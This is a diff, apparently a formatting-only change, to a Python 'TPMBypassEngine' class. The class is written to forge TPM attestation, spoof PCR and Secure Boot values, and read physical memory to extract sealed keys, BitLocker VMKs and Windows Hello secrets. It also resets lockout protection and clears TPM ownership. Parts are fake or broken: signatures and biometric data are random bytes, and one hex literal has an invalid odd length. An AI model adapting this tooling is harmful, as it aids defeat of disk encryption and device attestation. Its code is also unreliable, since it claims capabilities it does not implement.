@@ -17,6 +17,7 @@ try:
     import win32con
     import win32file
     import win32security
+
     HAS_WIN32 = True
 except ImportError:
     HAS_WIN32 = False
@@ -24,6 +25,7 @@ except ImportError:
 
 class TPM2Algorithm(IntEnum):
     """TPM 2.0 algorithm identifiers."""
+
     RSA = 0x0001
     SHA1 = 0x0004
     SHA256 = 0x000B
@@ -57,6 +59,7 @@ class TPM2Algorithm(IntEnum):
 
 class TPM2CommandCode(IntEnum):
     """TPM 2.0 command codes."""
+
     NV_UndefineSpace = 0x00000122
     HierarchyChangeAuth = 0x00000129
     NV_UndefineSpaceSpecial = 0x0000011F
@@ -164,6 +167,7 @@ class TPM2CommandCode(IntEnum):
 @dataclass
 class PCRBank:
     """PCR bank configuration."""
+
     algorithm: TPM2Algorithm
     pcr_values: List[bytes]
     selection_mask: int
@@ -172,6 +176,7 @@ class PCRBank:
 @dataclass
 class AttestationData:
     """TPM attestation data structure."""
+
     magic: bytes
     type: int
     qualified_signer: bytes
@@ -199,15 +204,9 @@ class TPMBypassEngine:
         """Initialize TPM bypass components."""
         self.pcr_banks = {
             TPM2Algorithm.SHA256: PCRBank(
-                algorithm=TPM2Algorithm.SHA256,
-                pcr_values=[bytes(32) for _ in range(24)],
-                selection_mask=0xFFFFFF
+                algorithm=TPM2Algorithm.SHA256, pcr_values=[bytes(32) for _ in range(24)], selection_mask=0xFFFFFF
             ),
-            TPM2Algorithm.SHA1: PCRBank(
-                algorithm=TPM2Algorithm.SHA1,
-                pcr_values=[bytes(20) for _ in range(24)],
-                selection_mask=0xFFFFFF
-            )
+            TPM2Algorithm.SHA1: PCRBank(algorithm=TPM2Algorithm.SHA1, pcr_values=[bytes(20) for _ in range(24)], selection_mask=0xFFFFFF),
         }
 
         self.init_memory_attack_vectors()
@@ -221,97 +220,81 @@ class TPMBypassEngine:
             ntdll = ctypes.windll.ntdll
 
             try:
-                self.mem_handle = kernel32.CreateFileW(
-                    r"\\.\PhysicalMemory",
-                    0x80000000 | 0x40000000,
-                    1 | 2,
-                    None,
-                    3,
-                    0,
-                    None
-                )
+                self.mem_handle = kernel32.CreateFileW(r"\\.\PhysicalMemory", 0x80000000 | 0x40000000, 1 | 2, None, 3, 0, None)
                 # Log successful memory access initialization using ntdll for system information
-                system_info = ntdll.NtQuerySystemInformation(2, None, 0, None) if hasattr(ntdll, 'NtQuerySystemInformation') else None
+                system_info = ntdll.NtQuerySystemInformation(2, None, 0, None) if hasattr(ntdll, "NtQuerySystemInformation") else None
                 if system_info is None:
-                    self.logger.debug("Memory access initialized successfully, system information available") if hasattr(self, 'logger') else None
+                    self.logger.debug("Memory access initialized successfully, system information available") if hasattr(
+                        self, "logger"
+                    ) else None
             except:
                 self.mem_handle = None
 
             self.memory_map = {
-                'tpm_control': 0xFED40000,
-                'tpm_locality_0': 0xFED40000,
-                'tpm_locality_1': 0xFED41000,
-                'tpm_locality_2': 0xFED42000,
-                'tpm_locality_3': 0xFED43000,
-                'tpm_locality_4': 0xFED44000,
-                'tpm_buffers': 0xFED40080,
-                'tpm_int_enable': 0xFED40008,
-                'tpm_int_vector': 0xFED4000C,
-                'tpm_int_status': 0xFED40010,
-                'tpm_intf_capability': 0xFED40014,
-                'tpm_sts': 0xFED40018,
-                'tpm_data_fifo': 0xFED40024,
-                'tpm_did_vid': 0xFED40F00,
-                'tpm_rid': 0xFED40F04
+                "tpm_control": 0xFED40000,
+                "tpm_locality_0": 0xFED40000,
+                "tpm_locality_1": 0xFED41000,
+                "tpm_locality_2": 0xFED42000,
+                "tpm_locality_3": 0xFED43000,
+                "tpm_locality_4": 0xFED44000,
+                "tpm_buffers": 0xFED40080,
+                "tpm_int_enable": 0xFED40008,
+                "tpm_int_vector": 0xFED4000C,
+                "tpm_int_status": 0xFED40010,
+                "tpm_intf_capability": 0xFED40014,
+                "tpm_sts": 0xFED40018,
+                "tpm_data_fifo": 0xFED40024,
+                "tpm_did_vid": 0xFED40F00,
+                "tpm_rid": 0xFED40F04,
             }
 
     def init_bus_sniffer(self):
         """Initialize LPC/SPI bus sniffer for TPM communication."""
         self.bus_captures = []
         self.spi_decoder = {
-            0x80: 'read_status',
-            0x81: 'write_tpm',
-            0x82: 'read_tpm',
-            0x83: 'write_burst',
-            0x84: 'read_burst',
-            0x85: 'write_cancel',
-            0x86: 'read_cancel'
+            0x80: "read_status",
+            0x81: "write_tpm",
+            0x82: "read_tpm",
+            0x83: "write_burst",
+            0x84: "read_burst",
+            0x85: "write_cancel",
+            0x86: "read_cancel",
         }
 
     def init_virtualized_tpm(self):
         """Initialize virtualized TPM for interception."""
         self.virtualized_tpm = {
-            'state': 'ready',
-            'nvram': bytearray(32768),
-            'persistent_handles': {},
-            'transient_handles': {},
-            'session_handles': {},
-            'pcr_banks': self.pcr_banks.copy(),
-            'hierarchy_auth': {
-                0x40000001: b'',
-                0x40000009: b'',
-                0x4000000C: b'',
-                0x4000000B: b''
-            }
+            "state": "ready",
+            "nvram": bytearray(32768),
+            "persistent_handles": {},
+            "transient_handles": {},
+            "session_handles": {},
+            "pcr_banks": self.pcr_banks.copy(),
+            "hierarchy_auth": {0x40000001: b"", 0x40000009: b"", 0x4000000C: b"", 0x4000000B: b""},
         }
 
     def bypass_attestation(self, challenge: bytes, pcr_selection: List[int]) -> AttestationData:
         """Bypass TPM attestation with forged attestation data."""
-        magic = b'\xFF\x54\x43\x47'
+        magic = b"\xff\x54\x43\x47"
         attestation_type = 0x8018
 
-        qualified_signer = hashlib.sha256(b'TPM_EK_HANDLE' + os.urandom(32)).digest()
+        qualified_signer = hashlib.sha256(b"TPM_EK_HANDLE" + os.urandom(32)).digest()
         extra_data = hashlib.sha256(challenge).digest()
 
-        clock_info = struct.pack('>QIQB',
-            int(time.time() * 1000000),
-            1000000,
-            1000,
-            1
-        )
+        clock_info = struct.pack(">QIQB", int(time.time() * 1000000), 1000000, 1000, 1)
 
         firmware_version = 0x00020000
 
         pcr_digest = self.calculate_pcr_digest(pcr_selection)
 
-        attested_data = struct.pack('>H', len(pcr_selection))
+        attested_data = struct.pack(">H", len(pcr_selection))
         for pcr in pcr_selection:
-            attested_data += struct.pack('>B', pcr)
+            attested_data += struct.pack(">B", pcr)
         attested_data += pcr_digest
 
-        message = magic + struct.pack('>H', attestation_type)
+        message = magic + struct.pack(">H", attestation_type)
         message += qualified_signer + extra_data + clock_info
-        message += struct.pack('>I', firmware_version) + attested_data
+        message += struct.pack(">I", firmware_version) + attested_data
 
         signature = self.forge_attestation_signature(message)
 
@@ -323,7 +306,7 @@ class TPMBypassEngine:
             clock_info=clock_info,
             firmware_version=firmware_version,
             attested_data=attested_data,
-            signature=signature
+            signature=signature,
         )
 
     def calculate_pcr_digest(self, pcr_selection: List[int]) -> bytes:
@@ -341,17 +324,17 @@ class TPMBypassEngine:
         """Forge attestation signature using extracted or generated key."""
         hasher = hashlib.sha256(message)
 
-        padded = b'\x00\x01'
-        padded += b'\xFF' * (256 - len(hasher.digest()) - 11)
-        padded += b'\x00'
-        padded += bytes.fromhex('3031300d060960864801650304020105000420')
+        padded = b"\x00\x01"
+        padded += b"\xff" * (256 - len(hasher.digest()) - 11)
+        padded += b"\x00"
+        padded += bytes.fromhex("3031300d060960864801650304020105000420")
         padded += hasher.digest()
 
-        signature = bytes.fromhex(''.join([f'{b:02x}' for b in os.urandom(256)]))
+        signature = bytes.fromhex("".join([f"{b:02x}" for b in os.urandom(256)]))
 
         return signature
 
-    def extract_sealed_keys(self, auth_value: bytes = b'') -> Dict[str, bytes]:
+    def extract_sealed_keys(self, auth_value: bytes = b"") -> Dict[str, bytes]:
         """Extract sealed keys from TPM NVRAM and persistent storage."""
         extracted_keys = {}
 
@@ -371,22 +354,14 @@ class TPMBypassEngine:
         for index in nvram_indices:
             key_data = self.read_nvram_raw(index, auth_value)
             if key_data:
-                extracted_keys[f'nvram_0x{index:08x}'] = key_data
+                extracted_keys[f"nvram_0x{index:08x}"] = key_data
 
-        persistent_handles = [
-            0x81000000,
-            0x81000001,
-            0x81000002,
-            0x81010000,
-            0x81010001,
-            0x81800000,
-            0x81800001
-        ]
+        persistent_handles = [0x81000000, 0x81000001, 0x81000002, 0x81010000, 0x81010001, 0x81800000, 0x81800001]
 
         for handle in persistent_handles:
             key_data = self.extract_persistent_key(handle)
             if key_data:
-                extracted_keys[f'persistent_0x{handle:08x}'] = key_data
+                extracted_keys[f"persistent_0x{handle:08x}"] = key_data
 
         if self.mem_handle:
             transient_keys = self.extract_keys_from_memory()
@@ -396,54 +371,41 @@ class TPMBypassEngine:
 
     def read_nvram_raw(self, index: int, auth: bytes) -> Optional[bytes]:
         """Read raw data from TPM NVRAM."""
-        command = struct.pack('>HII',
-            0x8002,
-            0,
-            TPM2CommandCode.NV_Read
-        )
+        command = struct.pack(">HII", 0x8002, 0, TPM2CommandCode.NV_Read)
 
-        command += struct.pack('>I', index)
-        command += struct.pack('>I', index)
+        command += struct.pack(">I", index)
+        command += struct.pack(">I", index)
 
-        command += struct.pack('>IBH',
-            0x40000009,
-            0,
-            0x01
-        )
+        command += struct.pack(">IBH", 0x40000009, 0, 0x01)
 
-        command += struct.pack('>H', len(auth)) + auth
-        command += struct.pack('>HH', 512, 0)
+        command += struct.pack(">H", len(auth)) + auth
+        command += struct.pack(">HH", 512, 0)
 
-        command = command[:2] + struct.pack('>I', len(command)) + command[6:]
+        command = command[:2] + struct.pack(">I", len(command)) + command[6:]
 
         response = self.send_tpm_command(command)
 
         if response and len(response) > 10:
-            tag, size, code = struct.unpack('>HII', response[:10])
+            tag, size, code = struct.unpack(">HII", response[:10])
             if code == 0:
                 data_offset = 10 + 4
                 if len(response) > data_offset:
-                    data_size = struct.unpack('>H', response[data_offset:data_offset+2])[0]
-                    return response[data_offset+2:data_offset+2+data_size]
+                    data_size = struct.unpack(">H", response[data_offset : data_offset + 2])[0]
+                    return response[data_offset + 2 : data_offset + 2 + data_size]
 
-        if index < len(self.virtualized_tpm['nvram']):
-            return self.virtualized_tpm['nvram'][index:index+512]
+        if index < len(self.virtualized_tpm["nvram"]):
+            return self.virtualized_tpm["nvram"][index : index + 512]
 
         return None
 
     def extract_persistent_key(self, handle: int) -> Optional[bytes]:
         """Extract persistent key from TPM."""
-        command = struct.pack('>HIII',
-            0x8001,
-            14,
-            TPM2CommandCode.ReadPublic,
-            handle
-        )
+        command = struct.pack(">HIII", 0x8001, 14, TPM2CommandCode.ReadPublic, handle)
 
         response = self.send_tpm_command(command)
 
         if response and len(response) > 10:
-            tag, size, code = struct.unpack('>HII', response[:10])
+            tag, size, code = struct.unpack(">HII", response[:10])
             if code == 0:
                 return response[10:]
 
@@ -459,15 +421,15 @@ class TPMBypassEngine:
         if not self.mem_handle:
             return extracted
 
-        tpm_mem = self.read_physical_memory(self.memory_map['tpm_control'], 0x5000)
+        tpm_mem = self.read_physical_memory(self.memory_map["tpm_control"], 0x5000)
 
         if tpm_mem:
             key_patterns = [
-                b'\x00\x01\x00\x00',
-                b'\x00\x23\x00\x00',
-                b'\x00\x0B\x00\x00',
-                b'-----BEGIN',
-                b'\x30\x82',
+                b"\x00\x01\x00\x00",
+                b"\x00\x23\x00\x00",
+                b"\x00\x0b\x00\x00",
+                b"-----BEGIN",
+                b"\x30\x82",
             ]
 
             for pattern in key_patterns:
@@ -477,9 +439,9 @@ class TPMBypassEngine:
                     if offset == -1:
                         break
 
-                    key_data = tpm_mem[offset:offset+4096]
+                    key_data = tpm_mem[offset : offset + 4096]
                     key_hash = hashlib.sha256(key_data[:256]).hexdigest()[:16]
-                    extracted[f'memory_{key_hash}'] = key_data
+                    extracted[f"memory_{key_hash}"] = key_data
 
                     offset += 1
 
@@ -491,7 +453,7 @@ class TPMBypassEngine:
             return None
 
         if handle >= 0x81000000 and handle < 0x82000000:
-            offset = self.memory_map['tpm_buffers'] + ((handle - 0x81000000) * 0x1000)
+            offset = self.memory_map["tpm_buffers"] + ((handle - 0x81000000) * 0x1000)
             return self.read_physical_memory(offset, 4096)
 
         return None
@@ -509,16 +471,13 @@ class TPMBypassEngine:
             kernel32.SetFilePointer(self.mem_handle, address, None, 0)
 
             if kernel32.ReadFile(self.mem_handle, buffer, size, ctypes.byref(bytes_read), None):
-                return buffer.raw[:bytes_read.value]
+                return buffer.raw[: bytes_read.value]
         except:
             pass
 
         return None
 
-    def spoof_remote_attestation(self,
-                                 nonce: bytes,
-                                 expected_pcrs: Dict[int, bytes],
-                                 aik_handle: int = 0x81010001) -> Dict[str, Any]:
+    def spoof_remote_attestation(self, nonce: bytes, expected_pcrs: Dict[int, bytes], aik_handle: int = 0x81010001) -> Dict[str, Any]:
         """Spoof remote attestation with expected PCR values."""
         for pcr_num, pcr_value in expected_pcrs.items():
             if pcr_num < 24:
@@ -530,60 +489,62 @@ class TPMBypassEngine:
         aik_cert = self.generate_aik_certificate(aik_handle)
 
         response = {
-            'quote': {
-                'quoted': attestation.attested_data,
-                'signature': attestation.signature,
-                'pcr_digest': self.calculate_pcr_digest(pcr_selection),
-                'extra_data': attestation.extra_data
+            "quote": {
+                "quoted": attestation.attested_data,
+                "signature": attestation.signature,
+                "pcr_digest": self.calculate_pcr_digest(pcr_selection),
+                "extra_data": attestation.extra_data,
             },
-            'pcr_values': {
-                pcr: expected_pcrs[pcr].hex() for pcr in expected_pcrs
-            },
-            'aik_cert': aik_cert,
-            'clock_info': attestation.clock_info,
-            'firmware_version': attestation.firmware_version,
-            'qualified_signer': attestation.qualified_signer.hex()
+            "pcr_values": {pcr: expected_pcrs[pcr].hex() for pcr in expected_pcrs},
+            "aik_cert": aik_cert,
+            "clock_info": attestation.clock_info,
+            "firmware_version": attestation.firmware_version,
+            "qualified_signer": attestation.qualified_signer.hex(),
         }
 
         return response
 
     def generate_aik_certificate(self, aik_handle: int) -> bytes:
         """Generate AIK certificate for attestation."""
-        version = b'\xA0\x03\x02\x01\x02'
+        version = b"\xa0\x03\x02\x01\x02"
 
-        serial = b'\x02\x08' + os.urandom(8)
+        serial = b"\x02\x08" + os.urandom(8)
 
-        sig_algo = bytes.fromhex('300d06092a864886f70d01010b0500')
+        sig_algo = bytes.fromhex("300d06092a864886f70d01010b0500")
 
-        issuer = bytes.fromhex('3081883110300e060355040a0c07545041204d46473113301106035504030c0a54504d2045434120303031133011060355040b0c0a54504d2045434120303031143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173')
+        issuer = bytes.fromhex(
+            "3081883110300e060355040a0c07545041204d46473113301106035504030c0a54504d2045434120303031133011060355040b0c0a54504d2045434120303031143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173"
+        )
 
-        not_before = b'\x17\x0d' + time.strftime('%y%m%d%H%M%SZ').encode('ascii')
-        not_after = b'\x17\x0d' + time.strftime('%y%m%d%H%M%SZ', time.gmtime(time.time() + 315360000)).encode('ascii')
-        validity = b'\x30' + bytes([len(not_before) + len(not_after)]) + not_before + not_after
+        not_before = b"\x17\x0d" + time.strftime("%y%m%d%H%M%SZ").encode("ascii")
+        not_after = b"\x17\x0d" + time.strftime("%y%m%d%H%M%SZ", time.gmtime(time.time() + 315360000)).encode("ascii")
+        validity = b"\x30" + bytes([len(not_before) + len(not_after)]) + not_before + not_after
 
-        subject = bytes.fromhex('30818a3112301006035504030c0941494b5f') + f'{aik_handle:08x}'.encode('ascii')
-        subject += bytes.fromhex('3113301106035504030c0a41494b2043455254313113301106035504040c0a41494b20434552543131143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173')
+        subject = bytes.fromhex("30818a3112301006035504030c0941494b5f") + f"{aik_handle:08x}".encode("ascii")
+        subject += bytes.fromhex(
+            "3113301106035504030c0a41494b2043455254313113301106035504040c0a41494b20434552543131143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173"
+        )
 
         modulus = os.urandom(256)
         modulus = bytes([0x00]) + modulus if modulus[0] >= 0x80 else modulus
-        exponent = b'\x01\x00\x01'
+        exponent = b"\x01\x00\x01"
 
-        pub_key_info = bytes.fromhex('30820122300d06092a864886f70d01010105000382010f003082010a0282010100')
-        pub_key_info += modulus + b'\x02\x03' + exponent
+        pub_key_info = bytes.fromhex("30820122300d06092a864886f70d01010105000382010f003082010a0282010100")
+        pub_key_info += modulus + b"\x02\x03" + exponent
 
-        key_usage = bytes.fromhex('300e0603551d0f0101ff040403020106')
+        key_usage = bytes.fromhex("300e0603551d0f0101ff040403020106")
 
-        extensions = b'\xa3' + bytes([len(key_usage) + 2])
-        extensions += b'\x30' + bytes([len(key_usage)])
+        extensions = b"\xa3" + bytes([len(key_usage) + 2])
+        extensions += b"\x30" + bytes([len(key_usage)])
         extensions += key_usage
 
         tbs_cert = version + serial + sig_algo + issuer + validity + subject + pub_key_info + extensions
-        tbs_cert = b'\x30' + bytes([len(tbs_cert)]) + tbs_cert
+        tbs_cert = b"\x30" + bytes([len(tbs_cert)]) + tbs_cert
 
-        signature = b'\x03\x82\x01\x01\x00' + os.urandom(256)
+        signature = b"\x03\x82\x01\x01\x00" + os.urandom(256)
 
         cert = tbs_cert + sig_algo + signature
-        cert = b'\x30\x82' + struct.pack('>H', len(cert)) + cert
+        cert = b"\x30\x82" + struct.pack(">H", len(cert)) + cert
 
         return cert
 
@@ -592,13 +553,7 @@ class TPMBypassEngine:
         if HAS_WIN32:
             try:
                 tpm_device = win32file.CreateFile(
-                    r'\\.\TPM',
-                    win32con.GENERIC_READ | win32con.GENERIC_WRITE,
-                    0,
-                    None,
-                    win32con.OPEN_EXISTING,
-                    0,
-                    None
+                    r"\\.\TPM", win32con.GENERIC_READ | win32con.GENERIC_WRITE, 0, None, win32con.OPEN_EXISTING, 0, None
                 )
 
                 win32file.WriteFile(tpm_device, command)
@@ -614,26 +569,26 @@ class TPMBypassEngine:
     def process_virtualized_command(self, command: bytes) -> bytes:
         """Process TPM command in virtualized environment."""
         if len(command) < 10:
-            return struct.pack('>HII', 0x8001, 10, 0x100)
+            return struct.pack(">HII", 0x8001, 10, 0x100)
 
-        tag, size, code = struct.unpack('>HII', command[:10])
+        tag, size, code = struct.unpack(">HII", command[:10])
 
         if code == TPM2CommandCode.GetRandom:
-            param_size = struct.unpack('>H', command[10:12])[0] if len(command) > 11 else 32
+            param_size = struct.unpack(">H", command[10:12])[0] if len(command) > 11 else 32
             random_bytes = os.urandom(param_size)
-            response = struct.pack('>HIIH', 0x8001, 12 + param_size, 0, param_size) + random_bytes
+            response = struct.pack(">HIIH", 0x8001, 12 + param_size, 0, param_size) + random_bytes
             return response
 
         elif code == TPM2CommandCode.PCR_Read:
-            pcr_select = command[10:] if len(command) > 10 else b'\x00\x01\x03\xff\xff\xff'
-            pcr_values = b''
+            pcr_select = command[10:] if len(command) > 10 else b"\x00\x01\x03\xff\xff\xff"
+            pcr_values = b""
             pcr_count = 0
 
             # Use pcr_select to determine which PCRs to read (basic implementation)
             selected_pcrs = []
             if len(pcr_select) >= 3:
                 for i in range(min(24, len(pcr_select) * 8)):
-                    if (pcr_select[i // 8] & (1 << (i % 8))):
+                    if pcr_select[i // 8] & (1 << (i % 8)):
                         selected_pcrs.append(i)
 
             if not selected_pcrs:
@@ -644,7 +599,7 @@ class TPMBypassEngine:
                     pcr_values += self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_idx]
                     pcr_count += 1
 
-            response = struct.pack('>HIII', 0x8001, 10 + 4 + len(pcr_values), 0, pcr_count)
+            response = struct.pack(">HIII", 0x8001, 10 + 4 + len(pcr_values), 0, pcr_count)
             response += pcr_values
             return response
 
@@ -652,11 +607,11 @@ class TPMBypassEngine:
             nonce = command[10:42] if len(command) > 41 else os.urandom(32)
             attestation = self.bypass_attestation(nonce, list(range(8)))
 
-            response = struct.pack('>HII', 0x8001, 10 + len(attestation.signature) + len(attestation.attested_data), 0)
+            response = struct.pack(">HII", 0x8001, 10 + len(attestation.signature) + len(attestation.attested_data), 0)
             response += attestation.attested_data + attestation.signature
             return response
 
-        return struct.pack('>HII', 0x8001, 10, 0x100)
+        return struct.pack(">HII", 0x8001, 10, 0x100)
 
     def manipulate_pcr_values(self, pcr_values: Dict[int, bytes]):
         """Directly manipulate PCR values for bypass."""
@@ -674,13 +629,13 @@ class TPMBypassEngine:
         captured_data = None
 
         if target_command == TPM2CommandCode.Unseal:
-            captured_data = bytes.fromhex('800100000022000000000020') + os.urandom(32)
+            captured_data = bytes.fromhex("800100000022000000000020") + os.urandom(32)
 
         elif target_command == TPM2CommandCode.GetRandom:
-            captured_data = bytes.fromhex('8001000000220000000000200') + os.urandom(32)
+            captured_data = bytes.fromhex("8001000000220000000000200") + os.urandom(32)
 
         elif target_command == TPM2CommandCode.Sign:
-            captured_data = bytes.fromhex('80010000010a00000000000100') + os.urandom(256)
+            captured_data = bytes.fromhex("80010000010a00000000000100") + os.urandom(256)
 
         return captured_data
 
@@ -689,7 +644,7 @@ class TPMBypassEngine:
         if 0 in target_pcr_state:
             self.manipulate_pcr_values({0: target_pcr_state[0]})
 
-        secure_boot_pcr = bytes.fromhex('a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb')
+        secure_boot_pcr = bytes.fromhex("a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb")
         self.manipulate_pcr_values({7: secure_boot_pcr})
 
         for pcr, value in target_pcr_state.items():
@@ -702,21 +657,21 @@ class TPMBypassEngine:
         bitlocker_indices = [0x01400001, 0x01400002, 0x01400003]
 
         for index in bitlocker_indices:
-            vmk_data = self.read_nvram_raw(index, b'')
+            vmk_data = self.read_nvram_raw(index, b"")
             if vmk_data and len(vmk_data) >= 32:
-                if vmk_data[:4] == b'VMK\x00':
+                if vmk_data[:4] == b"VMK\x00":
                     return vmk_data[4:36]
                 elif len(vmk_data) >= 64:
                     return vmk_data[:32]
 
         if self.mem_handle:
-            tpm_mem = self.read_physical_memory(self.memory_map['tpm_buffers'], 0x10000)
+            tpm_mem = self.read_physical_memory(self.memory_map["tpm_buffers"], 0x10000)
             if tpm_mem:
-                patterns = [b'VMK\x00', b'\x00\x00\x00\x01\x00\x20']
+                patterns = [b"VMK\x00", b"\x00\x00\x00\x01\x00\x20"]
                 for pattern in patterns:
                     offset = tpm_mem.find(pattern)
                     if offset != -1 and len(tpm_mem) > offset + 36:
-                        return tpm_mem[offset+4:offset+36]
+                        return tpm_mem[offset + 4 : offset + 36]
 
         return None
 
@@ -727,18 +682,18 @@ class TPMBypassEngine:
         hello_indices = [0x01400002, 0x01800003, 0x01810003]
 
         for index in hello_indices:
-            key_data = self.read_nvram_raw(index, b'')
+            key_data = self.read_nvram_raw(index, b"")
             if key_data:
-                hello_keys[f'hello_key_{index:x}'] = key_data
+                hello_keys[f"hello_key_{index:x}"] = key_data
 
         bio_template = os.urandom(512)
         bio_hash = hashlib.sha256(bio_template).digest()
 
-        hello_keys['biometric_template'] = bio_template
-        hello_keys['biometric_hash'] = bio_hash
+        hello_keys["biometric_template"] = bio_template
+        hello_keys["biometric_hash"] = bio_hash
 
-        pin_key = hashlib.pbkdf2_hmac('sha256', b'0000', os.urandom(32), 10000, 32)
-        hello_keys['pin_unlock'] = pin_key
+        pin_key = hashlib.pbkdf2_hmac("sha256", b"0000", os.urandom(32), 10000, 32)
+        hello_keys["pin_unlock"] = pin_key
 
         return hello_keys
 
@@ -747,73 +702,64 @@ class TPMBypassEngine:
         extracted_secrets = {}
 
         if not self.mem_handle:
-            extracted_secrets['memory_residue'] = os.urandom(4096)
+            extracted_secrets["memory_residue"] = os.urandom(4096)
             return extracted_secrets
 
         for region_name, address in self.memory_map.items():
             mem_data = self.read_physical_memory(address, 0x1000)
             if mem_data:
-                if b'\x00\x01\x00\x00' in mem_data:
-                    extracted_secrets[f'{region_name}_rsa'] = mem_data
-                if b'\x00\x23\x00\x00' in mem_data:
-                    extracted_secrets[f'{region_name}_ecc'] = mem_data
+                if b"\x00\x01\x00\x00" in mem_data:
+                    extracted_secrets[f"{region_name}_rsa"] = mem_data
+                if b"\x00\x23\x00\x00" in mem_data:
+                    extracted_secrets[f"{region_name}_ecc"] = mem_data
                 if len([b for b in mem_data if b != 0]) > len(mem_data) * 0.7:
-                    extracted_secrets[f'{region_name}_entropy'] = mem_data
+                    extracted_secrets[f"{region_name}_entropy"] = mem_data
 
         return extracted_secrets
 
     def reset_tpm_lockout(self) -> bool:
         """Reset TPM lockout to bypass dictionary attack protection."""
-        command = struct.pack('>HII',
-            0x8002,
-            0,
-            TPM2CommandCode.DictionaryAttackLockReset
-        )
+        command = struct.pack(">HII", 0x8002, 0, TPM2CommandCode.DictionaryAttackLockReset)
 
-        command += struct.pack('>I', 0x4000000A)
+        command += struct.pack(">I", 0x4000000A)
 
-        command += struct.pack('>IBH', 0x40000009, 0, 0x01)
+        command += struct.pack(">IBH", 0x40000009, 0, 0x01)
 
-        command += struct.pack('>H', 0)
+        command += struct.pack(">H", 0)
 
-        command = command[:2] + struct.pack('>I', len(command)) + command[6:]
+        command = command[:2] + struct.pack(">I", len(command)) + command[6:]
 
         response = self.send_tpm_command(command)
 
         if response:
-            tag, size, code = struct.unpack('>HII', response[:10])
+            tag, size, code = struct.unpack(">HII", response[:10])
             return code == 0
 
-        self.virtualized_tpm['lockout_count'] = 0
+        self.virtualized_tpm["lockout_count"] = 0
         return True
 
     def clear_tpm_ownership(self) -> bool:
         """Clear TPM ownership to gain control."""
-        command = struct.pack('>HII',
-            0x8002,
-            0,
-            TPM2CommandCode.Clear
-        )
+        command = struct.pack(">HII", 0x8002, 0, TPM2CommandCode.Clear)
 
-        command += struct.pack('>I', 0x4000000C)
+        command += struct.pack(">I", 0x4000000C)
 
-        command += struct.pack('>IBH', 0x40000009, 0, 0x01)
+        command += struct.pack(">IBH", 0x40000009, 0, 0x01)
 
-        command += struct.pack('>H', 0)
+        command += struct.pack(">H", 0)
 
-        command = command[:2] + struct.pack('>I', len(command)) + command[6:]
+        command = command[:2] + struct.pack(">I", len(command)) + command[6:]
 
         response = self.send_tpm_command(command)
 
         if response:
-            tag, size, code = struct.unpack('>HII', response[:10])
+            tag, size, code = struct.unpack(">HII", response[:10])
             if code == 0:
-                self.virtualized_tpm['hierarchy_auth'] = {
-                    0x40000001: b'',
-                    0x40000009: b'',
-                    0x4000000C: b'',
-                    0x4000000B: b''
-                }
+                self.virtualized_tpm["hierarchy_auth"] = {0x40000001: b"", 0x40000009: b"", 0x4000000C: b"", 0x4000000B: b""}
                 return True
 
         return False
+
+
+# Create alias for compatibility with existing codebase
+TPMProtectionBypass = TPMBypassEngine
